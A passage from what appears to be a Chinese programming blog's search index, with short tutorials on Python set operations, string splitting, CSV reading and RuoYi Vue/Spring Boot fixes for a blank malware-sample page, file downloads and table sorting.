8]</span></span><br></pre></td></tr></table></figure><p><strong>方法2</strong>：转化为set操作，<strong>速度快</strong>；<strong>重复元素不会保留</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 无重复元素</span></span><br><span class="line">a = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">b = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>]</span><br><span class="line">print(list(set(b).difference(set(a))))  <span class="comment"># [8]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有重复元素 </span></span><br><span class="line">a = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">b = [<span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">8</span>]</span><br><span class="line">print(list(set(b).difference(set(a))))  <span class="comment"># [8]</span></span><br></pre></td></tr></table></figure><h1 id="2-set的集合运算"><a class="markdownIt-Anchor" href="#2-set的集合运算"></a> 2 set的集合运算</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = set([<span class="number">3</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">40</span>])  <span class="comment"># 创建一个数值集合</span></span><br><span class="line">t = set([<span class="number">3</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">29</span>, <span class="number">81</span>])  <span class="comment"># 创建一个数值集合</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t 和 s的并集 ,等价于t.union(s)</span></span><br><span class="line">print(t | s)  <span class="comment"># &#123;1, 3, 5, 7, 40, 9, 10, 81, 20, 29&#125;</span></span><br><span class="line"><span class="comment"># t 和 s的交集 ,等价于t.intersection(s)</span></span><br><span class="line">print(t &amp; s)  <span class="comment"># &#123;9, 3, 5&#125;</span></span><br><span class="line"><span class="comment"># 求差集（项在t中，但不在s中）  ,等价于t.difference(s)</span></span><br><span class="line">print(t - s)  <span class="comment"># &#123;81, 1, 29, 7&#125;</span></span><br><span class="line"><span class="comment"># 对称差集（项在t或s中，但不会同时出现在二者中）,等价于t.symmetric_difference(s)</span></span><br><span class="line">print(t ^ s)  <span class="comment"># &#123;1, 7, 40, 10, 81, 20, 29&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-字符串-分割字符串</title>
      <link href="/2022/04/03/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2-%E5%88%86%E5%89%B2%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2022/04/03/Python-%E5%AD%97%E7%AC%A6%E4%B8%B2-%E5%88%86%E5%89%B2%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-前言"><a class="markdownIt-Anchor" href="#1-前言"></a> 1 前言</h1><p>工作过程中，会有分割字符串的需求，有可能是单个分隔符，也有可能是多个分隔符。</p><p><strong>参考</strong>：<a href="https://blog.csdn.net/zhuzuwei/article/details/78886662" target="_blank" rel="noopener">python split使用多个分隔符分割字符串</a></p><h1 id="2-实现"><a class="markdownIt-Anchor" href="#2-实现"></a> 2 实现</h1><h2 id="21-split"><a class="markdownIt-Anchor" href="#21-split"></a> 2.1 split()</h2><p><strong>参考</strong>：<a href="https://www.runoob.com/python/att-string-split.html" target="_blank" rel="noopener">Python split()方法</a></p><p><strong>缺点</strong>：python内建的<code>split()</code>函数只能使用<strong>单个分隔符</strong>，如果需要多个分隔符，需要使用下面的<code>re.split()</code>。</p><p><strong>描述</strong>：通过指定分隔符对字符串进行切片，如果参数 <code>num</code> 有指定值，则分隔 <code>num+1</code> 个子字符串。</p><p><strong>语法</strong>：<code>str.split(str=&quot;&quot;, num=string.count(str))</code></p><p><strong>参数</strong>：</p><ul><li><code>str</code>：分隔符，默认为所有的空字符，包括空格、换行(\n)、制表符(\t)等。</li><li><code>num</code>：分割次数。默认为 -1, 即分隔所有。</li></ul><p><strong>返回值</strong>：返回分割后的字符串列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">txt = <span class="string">"phx what\tphx\nai"</span>;</span><br><span class="line">print(txt.split())  <span class="comment"># ['phx', 'what', 'phx', 'ai']</span></span><br><span class="line">print(txt.split(<span class="string">' '</span>, <span class="number">1</span>))  <span class="comment"># ['phx', 'what\tphx\nai']</span></span><br><span class="line">print(txt.split(<span class="string">'phx'</span>))  <span class="comment"># ['', ' what\t', '\nai']</span></span><br></pre></td></tr></table></figure><h2 id="22-resplit"><a class="markdownIt-Anchor" href="#22-resplit"></a> 2.2 re.split()</h2><p><strong>优点</strong>：<code>re</code>模块的<code>split()</code>函数可以使用多个分隔符对句子进行分割，其中不同的分隔符要用 <code>|</code> 隔开。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">txt = <span class="string">"phx what\tphx\nai"</span>;</span><br><span class="line">print(re.split(<span class="string">" |\t"</span>, txt))  <span class="comment"># ['phx', 'what', 'phx\nai']</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python-文件-csv文件读取</title>
      <link href="/2022/04/03/Python-%E6%96%87%E4%BB%B6-csv%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
      <url>/2022/04/03/Python-%E6%96%87%E4%BB%B6-csv%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-前言"><a class="markdownIt-Anchor" href="#1-前言"></a> 1 前言</h1><p>最近在做毕设，数据集使用的天池竞赛的，csv数据格式的，下面整理下csv读取的几种方法。</p><p><strong>主要参考</strong>：<a href="https://blog.csdn.net/domoNaruto/article/details/81193281" target="_blank" rel="noopener">Python读取csv文件的几种方法</a></p><p>下面是测试文件<code>test.csv</code> 的内容（与下面的python代码同目录）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_id,label,api,tid,index</span><br><span class="line">1,5,LdrLoadDll,2488,0</span><br><span class="line">1,5,LdrGetProcedureAddress,2488,1</span><br><span class="line">1,5,LdrGetProcedureAddress,2488,2</span><br><span class="line">1,5,LdrGetProcedureAddress,2488,3</span><br><span class="line">1,5,LdrGetProcedureAddress,2488,4</span><br></pre></td></tr></table></figure><h1 id="2-读取操作"><a class="markdownIt-Anchor" href="#2-读取操作"></a> 2 读取操作</h1><h2 id="21-利用python-io读取文件"><a class="markdownIt-Anchor" href="#21-利用python-io读取文件"></a> 2.1 利用Python I/O读取文件</h2><h3 id="211-csvreader"><a class="markdownIt-Anchor" href="#211-csvreader"></a> 2.1.1 csv.reader()</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_csv</span><span class="params">(csv_path)</span>:</span></span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">with</span> open(csv_path) <span class="keyword">as</span> f:</span><br><span class="line">        csv_reader = csv.reader(f)  <span class="comment"># 使用csv.reader读取f中的内容</span></span><br><span class="line">        header = next(csv_reader)  <span class="comment"># 读取第一行每一列的标题</span></span><br><span class="line">        print(header)  <span class="comment"># ['file_id', 'label', 'api', 'tid', 'index']</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> csv_reader:  <span class="comment"># 将csv 文件中的数据保存到data中</span></span><br><span class="line">            data.append(row[<span class="number">1</span>])  <span class="comment"># 选择某一列加入到data数组中</span></span><br><span class="line">        print(data)  <span class="comment"># ['5', '5', '5', '5', '5']</span></span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    csv_path = <span class="string">".\\test.csv"</span></span><br><span class="line">    read_csv(csv_path=csv_path)</span><br></pre></td></tr></table></figure><h3 id="212-csvdictreader"><a class="markdownIt-Anchor" href="#212-csvdictreader"></a> 2.1.2 csv.DictReader()</h3><p>可以获取字段名，参考 <a href="https://zhuanlan.zhihu.com/p/405847004" target="_blank" rel="noopener">csv.DictReader 读取字段名（headers）</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_csv</span><span class="params">(csv_path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(csv_path, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        reader = csv.DictReader(f)</span><br><span class="line">        headers = reader.fieldnames  <span class="comment"># 字段名</span></span><br><span class="line">        print(headers)  <span class="comment"># ['file_id', 'label', 'api', 'tid', 'index']</span></span><br><span class="line">        column = [row[<span class="string">'index'</span>] <span class="keyword">for</span> row <span class="keyword">in</span> reader]  <span class="comment"># weight 同列的数据</span></span><br><span class="line">        print(column)  <span class="comment"># ['0', '1', '2', '3', '4']</span></span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    csv_path = <span class="string">".\\test.csv"</span></span><br><span class="line">    read_csv(csv_path=csv_path)</span><br></pre></td></tr></table></figure><h3 id="213-open"><a class="markdownIt-Anchor" href="#213-open"></a> 2.1.3 open()</h3><p>把csv文件当作文本文件，使用<code>open()</code>和<code>split</code>进行处理，但是存在明显缺点——<strong>如果字段中含有分隔符<code>,</code>，分割将会比较麻烦</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_csv</span><span class="params">(csv_path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(csv_path) <span class="keyword">as</span> f:</span><br><span class="line">        column = []</span><br><span class="line">        column_id = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            column.append(line.rstrip(<span class="string">"\n"</span>).split(<span class="string">','</span>)[column_id])</span><br><span class="line">        print(column)  <span class="comment"># ['file_id', '1', '1', '1', '1', '1']</span></span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    csv_path = <span class="string">".\\test.csv"</span></span><br><span class="line">    read_csv(csv_path=csv_path)</span><br></pre></td></tr></table></figure><h2 id="22-利用numpy读取"><a class="markdownIt-Anchor" href="#22-利用numpy读取"></a> 2.2 利用numpy读取</h2><p>缺点：<strong>csv里面的值只能是数值型的，字符串类型会报错，读取的值是按照float存储的</strong></p><p>解释：<code>delimiter</code>是分隔符，<code>skiprows</code>是跳过前<code>n</code>行，<code>usecols</code>是使用的列数，例子中读取的是<code>3,4</code>列。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_csv</span><span class="params">(csv_path)</span>:</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    data = np.loadtxt(open(csv_path, <span class="string">"rb"</span>), delimiter=<span class="string">","</span>, skiprows=n, usecols=[<span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    csv_path = <span class="string">".\\test.csv"</span></span><br><span class="line">    read_csv(csv_path=csv_path)</span><br></pre></td></tr></table></figure><h2 id="23-利用pandas读取"><a class="markdownIt-Anchor" href="#23-利用pandas读取"></a> 2.3 利用pandas读取</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_csv</span><span class="params">(csv_path)</span>:</span></span><br><span class="line">    data = pd.read_csv(csv_path, sep=<span class="string">','</span>, header=<span class="string">'infer'</span>, usecols=[<span class="number">2</span>])</span><br><span class="line">    print(data)</span><br><span class="line">    array = data.values[<span class="number">0</span>::, <span class="number">0</span>::]  <span class="comment"># 读取全部行，全部列</span></span><br><span class="line">    print(array)  <span class="comment"># array是数组形式存储，顺序与data读取的数据顺序格式相同</span></span><br><span class="line">    print(array[<span class="number">0</span>][<span class="number">0</span>])  <span class="comment"># LdrLoadDll</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    csv_path = <span class="string">".\\test.csv"</span></span><br><span class="line">    read_csv(csv_path=csv_path)</span><br></pre></td></tr></table></figure><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【开源代码学习--若依】恶意样本界面空白</title>
      <link href="/2022/03/26/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E7%95%8C%E9%9D%A2%E7%A9%BA%E7%99%BD/"/>
      <url>/2022/03/26/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E7%95%8C%E9%9D%A2%E7%A9%BA%E7%99%BD/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-问题"><a class="markdownIt-Anchor" href="#1-问题"></a> 1 问题</h1><p>恶意样本界面空白，没有数据；恶意家族界面正常。</p><img src="https://s2.loli.net/2022/03/26/jS3IDeH8hlpN2at.png" width="800" height="300" alt="图片名称" align="center" id="125"><img src="https://s2.loli.net/2022/03/26/g3sXzGJT52E8Zdo.png" width="800" height="300" alt="图片名称" align="center" id="126"><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><p>测试后端正常，数据也传到了前端。</p><p>最后排错，确定bug代码块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 动态分析-》图对话框 --&gt;</span><br><span class="line">&lt;el-dialog :title=&quot;title&quot; :visible.sync=&quot;open_dynamic_graph&quot; width=&quot;1100px&quot; append-to-body&gt;</span><br><span class="line">    &lt;el-image  :src=&quot;require(&apos;@/assets/graphviz_images/&apos;+this.img_path)&quot; :fit=&quot;cover&quot;&gt;&lt;/el-image&gt;</span><br><span class="line">&lt;/el-dialog&gt;</span><br></pre></td></tr></table></figure><p><strong>原因</strong>：<code>@/assets/graphviz_images/'+this.img_path</code> 文件不存在。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Element </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【开源代码学习--若依】vue+springboot文件下载</title>
      <link href="/2022/03/26/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91vue-springboot%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"/>
      <url>/2022/03/26/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91vue-springboot%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>需要文件下载功能，如下图所示：</p><img src="https://s2.loli.net/2022/03/26/MiuO3xawsctC8Vg.png" width="900" height="300" alt="图片名称" align="center" id="124"><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><h2 id="21-手写404无法下载"><a class="markdownIt-Anchor" href="#21-手写404无法下载"></a> 2.1 手写(404，无法下载)</h2><ul><li><p><a href="http://doc.ruoyi.vip/ruoyi/document/htsc.html#%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD" target="_blank" rel="noopener">若依手册——上传下载</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/1790636" target="_blank" rel="noopener">Java中将Map转String，String转Map</a></p></li><li><p><a href="https://www.cnblogs.com/javalinux/p/14807391.html" target="_blank" rel="noopener">vue+springboot文件下载</a></p></li><li><p><a href="https://www.freesion.com/article/77181445797/" target="_blank" rel="noopener">使用VUE和SPRING BOOT实现文件下载</a></p></li></ul><h2 id="22-使用官网提供的封装方法"><a class="markdownIt-Anchor" href="#22-使用官网提供的封装方法"></a> 2.2 使用官网提供的封装方法</h2><p><strong>参考</strong>：<a href="https://blog.51cto.com/YangRoc/5057161" target="_blank" rel="noopener">使用若依前后端分离下载需要授权的url文件 </a></p><ol><li><p>前端使用封装方法<code>this.$download.resource(resource);</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// 表格中的下载按钮</span><br><span class="line">&lt;el-table-column label=&quot;下载报告&quot; align=&quot;center&quot; class-name=&quot;small-padding fixed-width&quot;&gt;</span><br><span class="line">    &lt;template slot-scope=&quot;scope&quot;&gt;</span><br><span class="line">&lt;el-button</span><br><span class="line">           size=&quot;mini&quot;</span><br><span class="line">           type=&quot;text&quot;</span><br><span class="line">           icon=&quot;el-icon-download&quot;</span><br><span class="line">           @click=&quot;handleDownload(scope.row)&quot;</span><br><span class="line">           v-hasPermi=&quot;[&apos;system:report:downLoad:test&apos;]&quot;</span><br><span class="line">           &gt;下载&lt;/el-button&gt;</span><br><span class="line">    &lt;/template&gt;</span><br><span class="line">&lt;/el-table-column&gt;</span><br><span class="line"></span><br><span class="line">// handleDownload(scope.row)函数实现</span><br><span class="line">/** 下载报告按钮操作 */</span><br><span class="line">handleDownload(row) &#123;</span><br><span class="line">    this.reset();</span><br><span class="line">    const id = row.id || this.ids</span><br><span class="line">    const resource = &quot;/profile/upload/&quot; + row.reportName;  // 不再设立实体类</span><br><span class="line">    // 默认方法</span><br><span class="line">    this.$download.resource(resource);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li><li><p>增加对xml文件的授权：修改<code>MimeTypeUtils.java</code>文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_ALLOWED_EXTENSION = &#123;</span><br><span class="line">    <span class="comment">// 图片</span></span><br><span class="line">    <span class="string">"bmp"</span>, <span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"jpeg"</span>, <span class="string">"png"</span>,</span><br><span class="line">    <span class="comment">// word excel powerpoint</span></span><br><span class="line">    <span class="string">"doc"</span>, <span class="string">"docx"</span>, <span class="string">"xls"</span>, <span class="string">"xlsx"</span>, <span class="string">"ppt"</span>, <span class="string">"pptx"</span>, <span class="string">"html"</span>, <span class="string">"htm"</span>, <span class="string">"txt"</span>,</span><br><span class="line">    <span class="comment">// 压缩文件</span></span><br><span class="line">    <span class="string">"rar"</span>, <span class="string">"zip"</span>, <span class="string">"gz"</span>, <span class="string">"bz2"</span>,</span><br><span class="line">    <span class="comment">// 视频格式</span></span><br><span class="line">    <span class="string">"mp4"</span>, <span class="string">"avi"</span>, <span class="string">"rmvb"</span>,</span><br><span class="line">    <span class="comment">// pdf</span></span><br><span class="line">    <span class="string">"pdf"</span>,</span><br><span class="line">    <span class="comment">// xml</span></span><br><span class="line">    <span class="string">"xml"</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>修改资源默认路径，资源默认路径是<code>D:\ruoyi\uploadPath\upload</code>，修改文件<code>RuoYi-Vue\ruoyi-admin\src\main\resources\application.yml</code></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 项目相关配置</span></span><br><span class="line"><span class="attr">ruoyi:</span></span><br><span class="line">  <span class="comment"># 名称</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">RuoYi</span></span><br><span class="line">  <span class="comment"># 版本</span></span><br><span class="line">  <span class="attr">version:</span> <span class="number">3.8</span><span class="number">.1</span></span><br><span class="line">  <span class="comment"># 版权年份</span></span><br><span class="line">  <span class="attr">copyrightYear:</span> <span class="number">2022</span></span><br><span class="line">  <span class="comment"># 实例演示开关</span></span><br><span class="line">  <span class="attr">demoEnabled:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># 文件路径 示例（ Windows配置D:/ruoyi/uploadPath，Linux配置 /home/ruoyi/uploadPath）</span></span><br><span class="line">  <span class="attr">profile:</span> <span class="string">E:/05</span> <span class="string">Code/RMDVS/uploadPath</span></span><br><span class="line">  <span class="comment"># 获取ip地址开关</span></span><br><span class="line">  <span class="attr">addressEnabled:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># 验证码类型 math 数组计算 char 字符验证</span></span><br><span class="line">  <span class="attr">captchaType:</span> <span class="string">math</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="23-补充修改日志默认路径"><a class="markdownIt-Anchor" href="#23-补充修改日志默认路径"></a> 2.3 补充(修改日志默认路径)</h2><p>日志默认路径：<code>E:\home\ruoyi\logs</code></p><p>修改文件：<code>RuoYi-Vue\ruoyi-admin\src\main\resources\logback.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 日志存放路径 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;property name="log.path" value="/home/ruoyi/logs" /&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"log.path"</span> <span class="attr">value</span>=<span class="string">"E:/05 Code/RMDVS/logs"</span> /&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Spring Boot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【开源代码学习--若依】表格同列排序</title>
      <link href="/2022/03/26/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91%E8%A1%A8%E6%A0%BC%E5%90%8C%E5%88%97%E6%8E%92%E5%BA%8F/"/>
      <url>/2022/03/26/%E3%80%90%E5%BC%80%E6%BA%90%E4%BB%A3%E7%A0%81%E5%AD%A6%E4%B9%A0--%E8%8B%A5%E4%BE%9D%E3%80%91%E8%A1%A8%E6%A0%BC%E5%90%8C%E5%88%97%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引入"><a class="markdownIt-Anchor" href="#1-引入"></a> 1 引入</h1><p>在表格中，需要根据同一列中的内容进行排序。如下图所示：</p><img src="https://s2.loli.net/2022/03/26/gDWL1YdseFHj7MQ.png" width="900" height="300" alt="图片名称" align="center" id="123"><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><p>table标签：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-table v-loading=&quot;loading&quot; :data=&quot;familyList&quot; @selection-change=&quot;handleSelectionChange&quot; :default-sort=&quot;defaultSort&quot; @sort-change=&quot;handleSortChange&quot;&gt;</span><br></pre></td></tr></table></figure><p>table-column标签：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;el-table-column label=&quot;家族中样本平均得分&quot; align=&quot;center&quot; prop=&quot;averageScore&quot; sortable=&quot;custom&quot; :sort-orders=&quot;[&apos;descending&apos;, &apos;ascending&apos;]&quot; /&gt;</span><br></pre></td></tr></table></figure><p>涉及参数及函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 